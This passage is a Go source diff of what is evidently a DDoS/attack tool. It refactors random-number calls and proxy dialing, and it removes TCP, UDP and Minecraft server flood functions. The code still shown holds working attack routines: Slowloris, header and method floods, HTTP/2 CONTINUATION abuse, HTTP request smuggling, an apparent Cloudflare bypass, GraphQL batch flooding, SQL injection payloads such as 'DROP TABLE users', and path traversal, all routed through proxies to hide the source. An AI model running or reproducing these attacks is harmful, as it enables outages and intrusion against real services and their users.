     body := genAPIPayload()
-    fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]
+    fullURL := targetURL + apiEndpoints[rand.IntN(len(apiEndpoints))]
 
     req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
     if err != nil {
@@ -1118,38 +993,16 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -1177,7 +1030,7 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
 
     fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())
 
-    ticker := time.NewTicker(1 + time.Duration(rand.Intn(3))*time.Second)
+    ticker := time.NewTicker(1 + time.Duration(rand.IntN(3))*time.Second)
     defer ticker.Stop()
 
     for {
@@ -1206,7 +1059,7 @@ func httpHeaderFlood(targetURL string, client *http.Client) error {
     }
     req.Header.Set("User-Agent", randUA())
 
-    numHeaders := 50 + rand.Intn(50)
+    numHeaders := 50 + rand.IntN(50)
     for i := 0; i < numHeaders; i++ {
         req.Header.Set("X-"+randString(8), randString(1024))
     }
@@ -1227,16 +1080,16 @@ func httpHeaderFlood(targetURL string, client *http.Client) error {
 func httpMixPost(targetURL string, client *http.Client) error {
     var body string
     var contentType string
-    switch rand.Intn(4) {
+    switch rand.IntN(4) {
     case 0:
         contentType = "application/json"
-        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.Intn(9999), randString(32))
+        body = fmt.Sprintf(`{"data":"%s","id":%d,"token":"%s"}`, randString(500), rand.IntN(9999), randString(32))
     case 1:
         contentType = "application/xml"
-        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), rand.Intn(9999))
+        body = fmt.Sprintf(`<root><data>%s</data><id>%d</id></root>`, randString(500), rand.IntN(9999))
     case 2:
         contentType = "application/x-www-form-urlencoded"
-        body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.Intn(9999))
+        body = "data=" + randString(500) + "&id=" + strconv.Itoa(rand.IntN(9999))
     case 3:
         contentType = "text/plain"
         body = randString(500)
@@ -1271,7 +1124,7 @@ func httpCFBypass(targetURL string, client *http.Client) error {
     if strings.Contains(targetURL, "?") {
         sep = "&"
     }
-    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.Intn(9999))
+    fullURL := targetURL + sep + "q=" + randString(15) + "&p=" + strconv.Itoa(rand.IntN(9999))
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -1372,7 +1225,7 @@ func (r *chunkDripReader) Read(p []byte) (int, error) {
     select {
     case <-r.stop:
         return 0, io.EOF
-    case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
+    case <-time.After(time.Duration(500+rand.IntN(1500)) * time.Millisecond):
         n := copy(p, []byte(randString(10)))
         return n, nil
     }
@@ -1432,38 +1285,16 @@ func httpMalformed(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -1522,38 +1353,16 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -1691,12 +1500,12 @@ func httpGraphQLBatch(targetURL string, client *http.Client) error {
     fullURL := targetURL + "/api/graphql"
     var sb strings.Builder
     sb.WriteString("[")
-    n := 100 + rand.Intn(500)
+    n := 100 + rand.IntN(500)
     for i := 0; i < n; i++ {
         if i > 0 {
             sb.WriteByte(',')
         }
-        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, rand.Intn(9999)))
+        sb.WriteString(fmt.Sprintf(`{"q%d":{"query":"query { user(id: %d) { name email posts { title } } }"}}`, i, rand.IntN(9999)))
     }
     sb.WriteString("]")
     body := sb.String()
@@ -1823,38 +1632,16 @@ func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -1919,779 +1706,6 @@ func httpPingback(targetURL string, client *http.Client) error {
     return nil
 }
 
-func tcpConnect(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    deadline := time.Now().Add(time.Duration(5+rand.Intn(5)) * time.Second)
-    ticker := time.NewTicker(1 * time.Second)
-    defer ticker.Stop()
-
-    for {
-        select {
-        case <-stop:
-            return nil
-        case <-ticker.C:
-            if time.Now().After(deadline) {
-                recordStatus("Sent")
-                totalSuccess.Add(1)
-                return nil
-            }
-            payload := make([]byte, 64)
-            rand.Read(payload)
-            _, err := conn.Write(payload)
-            if err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-            recordStatus("Sent")
-            totalSuccess.Add(1)
-        }
-    }
-}
-
-func tcpSlow(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    ticker := time.NewTicker(time.Duration(2+rand.Intn(3)) * time.Second)
-    defer ticker.Stop()
-
-    for {
-        select {
-        case <-stop:
-            return nil
-        case <-ticker.C:
-            _, err := conn.Write([]byte{0x00})
-            if err != nil {
-                recordStatus("Err")
-                totalErrors.Add(1)
-                return err
-            }
-            recordStatus("Held")
-            totalSuccess.Add(1)
-        }
-    }
-}
-
-func tcpPayload(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 1024)
-    rand.Read(payload)
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func udpFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "80"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    conn, err := net.Dial("udp", addr)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    defer conn.Close()
-
-    payload := make([]byte, 1024)
-    rand.Read(payload)
-    _, err = conn.Write(payload)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcPingFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x01)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    reqPacket := []byte{0x01, 0x00}
-
-    _, err = conn.Write(packet)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    _, err = conn.Write(reqPacket)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcBotJoin(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0x2F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    username := randString(16)
-    nameLen := len(username)
-    loginStart := []byte{0x00, byte(nameLen)}
-    loginStart = append(loginStart, []byte(username)...)
-
-    reqLen := len(loginStart)
-    reqPacket := []byte{byte(reqLen)}
-    reqPacket = append(reqPacket, loginStart...)
-
-    conn.Write(packet)
-    conn.Write(reqPacket)
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcBigPacket(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(len(host))}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    conn.Write(packet)
-
-    bigLen := []byte{0x80, 0x80, 0x80, 0x80, 0x08}
-    loginStartHeader := append([]byte{0x00}, bigLen...)
-    conn.Write(loginStartHeader)
-
-    smallPayload := make([]byte, 64)
-    rand.Read(smallPayload)
-    conn.Write(smallPayload)
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcLegacyPing(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    legacyPing := []byte{0xFE, 0x01}
-    _, err = conn.Write(legacyPing)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcNullPing(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x01)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    _, err = conn.Write(packet)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    _, err = conn.Write([]byte{0x01, 0x00})
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(15+rand.Intn(15)) * time.Second)
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcHandshakeFlood(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    for i := 0; i < 100; i++ {
-        randomHost := randString(10) + "." + host
-        hostLen := len(randomHost)
-        handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-        handshake = append(handshake, []byte(randomHost)...)
-        portInt, _ := strconv.Atoi(port)
-        portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-        handshake = append(handshake, portBytes...)
-        handshake = append(handshake, 0x01)
-
-        pktLen := len(handshake)
-        packet := []byte{byte(pktLen)}
-        packet = append(packet, handshake...)
-
-        _, err = conn.Write(packet)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcHold(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x01)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    _, err = conn.Write(packet)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    _, err = conn.Write([]byte{0x01, 0x00})
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    buf := make([]byte, 4096)
-    conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    conn.Read(buf)
-
-    time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)
-
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func mcData(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-    host := u.Hostname()
-    port := u.Port()
-    if port == "" {
-        port = "25565"
-    }
-    addr := net.JoinHostPort(host, port)
-
-    var conn net.Conn
-    if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
-        pURL, err := url.Parse(proxy)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        conn, err = dialViaProxy("tcp", addr, pURL)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    } else {
-        conn, err = net.DialTimeout("tcp", addr, 15*time.Second)
-        if err != nil {
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-    }
-    defer conn.Close()
-
-    hostLen := len(host)
-    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
-    handshake = append(handshake, []byte(host)...)
-    portInt, _ := strconv.Atoi(port)
-    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
-    handshake = append(handshake, portBytes...)
-    handshake = append(handshake, 0x02)
-
-    pktLen := len(handshake)
-    packet := []byte{byte(pktLen)}
-    packet = append(packet, handshake...)
-
-    _, err = conn.Write(packet)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    garbage := make([]byte, 256)
-    rand.Read(garbage)
-    _, err = conn.Write(garbage)
-    if err != nil {
-        recordStatus("Err")
-        totalErrors.Add(1)
-        return err
-    }
-
-    time.Sleep(time.Duration(10+rand.Intn(5)) * time.Second)
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
 func httpOptionsFlood(targetURL string, client *http.Client) error {
     req, err := http.NewRequest("OPTIONS", targetURL, nil)
     if err != nil {
@@ -2749,7 +1763,7 @@ func httpDeleteFlood(targetURL string, client *http.Client) error {
 }
 
 func httpPutFlood(targetURL string, client *http.Client) error {
-    body := fmt.Sprintf(`{"id":"%s","data":"%s","timestamp":%d}`, randString(36), randString(500+rand.Intn(2000)), time.Now().Unix())
+    body := fmt.Sprintf(`{"id":"%s","data":"%s","timestamp":%d}`, randString(36), randString(500+rand.IntN(2000)), time.Now().Unix())
     sep := "/"
     if strings.HasSuffix(targetURL, "/") {
         sep = ""
@@ -2840,7 +1854,7 @@ func httpSQLiProbe(targetURL string, client *http.Client) error {
         sep = "&"
     }
     payloads := []string{"' OR '1'='1", "1; DROP TABLE users", "' UNION SELECT NULL, version()--"}
-    fullURL := targetURL + sep + "id=" + url.QueryEscape(payloads[rand.Intn(len(payloads))])
+    fullURL := targetURL + sep + "id=" + url.QueryEscape(payloads[rand.IntN(len(payloads))])
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -2870,7 +1884,7 @@ func httpPathTraversal(targetURL string, client *http.Client) error {
     if strings.HasSuffix(targetURL, "/") {
         sep = ""
     }
-    fullURL := targetURL + sep + payloads[rand.Intn(len(payloads))]
+    fullURL := targetURL + sep + payloads[rand.IntN(len(payloads))]
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
@@ -2914,38 +1928,16 @@ func httpSmuggleTete(targetURL string, stop <-chan struct{}) error {
 
     var rawConn net.Conn
     if len(proxyList) > 0 {
-        proxy := proxyList[rand.Intn(len(proxyList))]
+        proxy := proxyList[rand.IntN(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
             recordStatus("Err")
             totalErrors.Add(1)
             return err
         }
-        rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+        rawConn, err = dialViaProxy("tcp", addr, pURL)
         if err != nil {
             recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
-        if _, err := rawConn.Write([]byte(connectReq)); err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        br := bufio.NewReader(rawConn)
-        resp, err := http.ReadResponse(br, nil)
-        if err != nil {
-            rawConn.Close()
-            recordStatus("Err")
-            totalErrors.Add(1)
-            return err
-        }
-        resp.Body.Close()
-        if resp.StatusCode != 200 {
-            rawConn.Close()
-            recordStatus("ProxyErr")
             totalErrors.Add(1)
             return err
         }
@@ -2979,615 +1971,6 @@ func httpSmuggleTete(targetURL string, stop <-chan struct{}) error {
         totalErrors.Add(1)
         return err
     }
-    recordStatus("Sent")
-    totalSuccess.Add(1)
-    return nil
-}
-
-func dnsQuery(targetURL string, stop <-chan struct{}) error {
-    u, err := url.Parse(targetURL)
-    if err != nil {
-        recordStatus("Err")
